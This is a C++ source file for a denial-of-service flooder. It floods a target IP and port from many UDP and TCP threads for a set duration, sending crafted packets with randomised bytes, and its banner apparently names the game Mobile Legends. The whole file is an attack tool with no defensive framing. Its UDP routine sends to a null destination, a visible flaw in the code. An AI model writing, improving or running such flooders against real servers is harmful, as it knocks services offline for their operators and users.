#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <atomic>
#include <random>
#include <chrono>
#include <cstring>
#include <csignal>
#include <sstream>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>

std::atomic<bool> udp_running(false);
std::atomic<bool> tcp_running(false);

void create_udp_socket(int &sock) {
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    while (true) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(rand() % (65535 - 32768 + 1) + 32768);
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            break;
        }
    }
}

void create_tcp_socket(int &sock, const std::string &target_ip, int target_port) {
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int one = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 900000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    while (true) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(rand() % (65535 - 32768 + 1) + 32768);
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            break;
        }
    }
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(target_ip.c_str());
    target_addr.sin_port = htons(target_port);
    connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
}

void udp_flood(const std::string &target_ip, int target_port) {
    int sock;
    create_udp_socket(sock);
    udp_running = true;
    while (udp_running) {
        unsigned char data[48];
        data[0] = 0x01;
        data[1] = 0x71;
        for (int i = 2; i < 14; ++i) data[i] = rand() % 256;
        memcpy(data + 14, "\x2e\x61\x62\x6f\x6d\x20\x54\x53\x45\x62\x20\x45\x48\x74\x2e\x53\x44\x4e\x45\x47\x45\x6c\x20\x45\x4c\x49\x42\x4f\x6d\x01", 34);
        sendto(sock, data, sizeof(data), 0, nullptr, 0);
    }
    close(sock);
}

void tcp_flood(const std::string &target_ip, int target_port) {
    tcp_running = true;
    while (tcp_running) {
        int sock;
        create_tcp_socket(sock, target_ip, target_port);
        unsigned char data[22] = {0x00, 0x00, 0x00, 0x17, 0x70, 0x00, 0xf5, 0x07, 0x01};
        data[9] = rand() % 256;
        data[10] = rand() % 256;
        memcpy(data + 11, "\x45\x07\x70\x00", 4);
        data[15] = rand() % 256;
        data[16] = rand() % 256;
        data[17] = rand() % 256;
        data[18] = rand() % 256;
        memcpy(data + 19, "\x80\x06\x01\x80", 4);
        if (send(sock, data, sizeof(data), 0) <= 0) {
            close(sock);
            break;
        }
        close(sock);
    }
}

void end_task(int duration, std::atomic<bool> &flag) {
    std::this_thread::sleep_for(std::chrono::seconds(duration));
    flag = false;
}

void print_banner() {
    std::vector<std::string> colors = {
        "\033[31m", "\033[38;5;196m", "\033[38;5;88m", "\033[38;5;52m", "\033[38;5;124m",
        "\033[38;5;208m", "\033[38;5;202m", "\033[38;5;214m", "\033[38;5;166m", "\033[38;5;130m",
        "\033[33m", "\033[38;5;226m", "\033[38;5;220m", "\033[38;5;190m", "\033[38;5;142m",
        "\033[38;5;214m", "\033[38;5;220m", "\033[38;5;215m", "\033[38;5;220m"
    };
    std::string banner = 
        "┳┳┓  ┓ •┓    ┓          ┓    ┏┓        ┳┓      ╻\n"
        "┃┃┃┏┓┣┓┓┃┏┓  ┃ ┏┓┏┓┏┓┏┓┏┫┏•  ┃┓┏┓┏┓┏┓  ┣┫┏┓┏┓┏┓┃\n"
        "┛ ┗┗┛┗┛┗┗┗   ┗┛┗ ┗┫┗ ┛┗┗┻┛•  ┗┛┗┻┛┗┗┫  ┻┛┗┻┛┗┗┫•\n"
        "                  ┛                 ┛         ┛";
    for (char &c : banner) {
        std::cout << colors[rand() % colors.size()] << c << "\033[0m";
    }
    std::cout << std::endl;
}

int main(int argc, char *argv[]) {
    std::string target;
    int udp_thread_count = 25, tcp_thread_count = 25;
    int udp_duration = 300, tcp_duration = 300;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-t" || arg == "--target") {
            target = argv[++i];
        } else if (arg == "-utc" || arg == "--udp_thread_count") {
            udp_thread_count = std::stoi(argv[++i]);
        } else if (arg == "-ttc" || arg == "--tcp_thread_count") {
            tcp_thread_count = std::stoi(argv[++i]);
        } else if (arg == "-ud" || arg == "--udp_duration") {
            udp_duration = std::stoi(argv[++i]);
        } else if (arg == "-td" || arg == "--tcp_duration") {
            tcp_duration = std::stoi(argv[++i]);
        }
    }

    std::string target_ip = target.substr(0, target.find(':'));
    int target_port = std::stoi(target.substr(target.find(':') + 1));

    std::vector<std::thread> udp_threads, tcp_threads;
    for (int i = 0; i < udp_thread_count; ++i) {
        udp_threads.emplace_back(udp_flood, target_ip, target_port);
    }
    for (int i = 0; i < tcp_thread_count; ++i) {
        tcp_threads.emplace_back(tcp_flood, target_ip, target_port);
    }

    std::thread udp_end_thread(end_task, udp_duration, std::ref(udp_running));
    std::thread tcp_end_thread(end_task, tcp_duration, std::ref(tcp_running));

    print_banner();

    for (auto &t : udp_threads) {
        t.join();
    }
    for (auto &t : tcp_threads) {
        t.join();
    }
    udp_end_thread.join();
    tcp_end_thread.join();

    return 0;
}
